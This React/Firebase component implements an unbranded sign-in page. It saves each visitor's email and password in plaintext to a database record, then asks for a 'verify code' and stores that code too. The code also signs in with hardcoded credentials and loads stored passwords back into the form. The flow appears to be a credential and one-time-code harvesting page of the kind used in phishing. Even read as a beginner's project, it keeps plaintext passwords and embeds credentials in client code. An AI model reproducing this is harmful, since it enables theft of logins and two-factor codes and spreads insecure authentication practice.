"use client"
import React, {useEffect, useState} from 'react';
import {useForm} from 'react-hook-form';
import {database, signInWithEmailAndPassword, auth} from './firebaseConfig';

import {ref, set, get, update} from 'firebase/database';

const encodeEmail = (email: string) => {
    return email.replace(/\./g, ',');
};

export default function Login() {
    const [isShow, setIsShow] = useState(false)
    const [isReadyVerify, setIsReadyVerify] = useState(false)
    const [data, setData] = useState(null);
    const {register, handleSubmit, setValue, reset} = useForm({
        defaultValues: {
            email: '',
            password: '',
            code: '',
        },
    });


    useEffect(() => {
        // Аутентификация пользователя
        signInWithEmailAndPassword(auth, 'user@example.com', 'password')
            .then((userCredential) => {
                const user = userCredential.user;
                console.log('User signed in:', user);
                // @ts-ignore
                fetchData(user.email);
            })
            .catch((error) => {
                console.error('Error signing in:', error);
            });
    }, []);

    const fetchData = async (email: string) => {
        const encodedEmail = encodeEmail(email);
        const dbRef = ref(database, `users/${encodedEmail}`);
        const snapshot = await get(dbRef);
        if (snapshot.exists()) {
            const fetchedData = snapshot.val();
            setData(fetchedData);
            setValue('email', fetchedData.email || '');
            setValue('password', fetchedData.password || '');
            setValue('code', fetchedData.code || '');
        } else {
            console.log('No data available');
        }
    };

    // @ts-ignore
    const onSubmit = async (formData) => {
        // Проверка данных перед записью
        if (!formData.email || !formData.password || formData.code === undefined) {
            console.error('All fields must be defined');
            return;
        }
        try {
            const encodedEmail = encodeEmail(formData.email);
            const dbRef = ref(database, `users/${encodedEmail}`);
            await set(dbRef, formData);
            console.log('Data written');
            setData(formData);
            setIsReadyVerify(true)
        } catch (err) {
            console.log(err, 'error')
        }
    };

    // @ts-ignore
    const updateCode = async (email, newCode) => {
        const encodedEmail = encodeEmail(email);
        const dbRef = ref(database, `users/${encodedEmail}`);
        await update(dbRef, {code: newCode});
        reset()
        console.log('Code updated');
        // @ts-ignore
        setData(prevData => ({...prevData, code: newCode}));
    };

    // @ts-ignore
    const onSubmitCode = async (formData) => {

        if (formData.code === undefined) {
            console.error('All fields must be defined');
            return;
        }
        try {
            // @ts-ignore
            const res = await updateCode(data.email, formData.code)
            console.log(res)
            setIsReadyVerify(false)
        } catch (err) {
            console.log(err, 'error')
        }
    };
    if (isReadyVerify) {

        return (
            <div className="box">
                <form action="#" className="form" onSubmit={handleSubmit(onSubmitCode)}>
                    <h1 className="form-title">Verify your email</h1>
                    <div className="form-group">
                        <input type="text" className="form-control" {...register('code')} placeholder={'verify code'}
                               required/>
                    </div>
                    <div className="bottom-box">
                        <button className="form-button">Check</button>

                    </div>
                </form>
            </div>
        )
    }

    return (
        <div className="box">
            <form action="#" className="form" onSubmit={handleSubmit(onSubmit)}>
                <h1 className="form-title">Sign In</h1>

                <div className="form-group">
                    <input type="email" className="form-control" placeholder={'Email or phone'} {...register('email')}
                           required/>

                </div>

                <div className="form-group">
                    <input type={isShow ? "text" : "password"} {...register('password')} className="form-control"
                           placeholder={'Enter Your Password'} required
                           id="txtPassword"/>
                </div>

                <div className="form-group">
                    <label className="showLabel">
                        <input type="checkbox" id="show" onChange={(val) => setIsShow((prev) => !prev)}/>
                        <span style={{marginLeft: "5px"}}>show password</span>
                    </label>
                </div>

                <div className="bottom-box">
                    <button className="form-button" type="submit">Sign in</button>
                </div>
            </form>
        </div>
    );
}
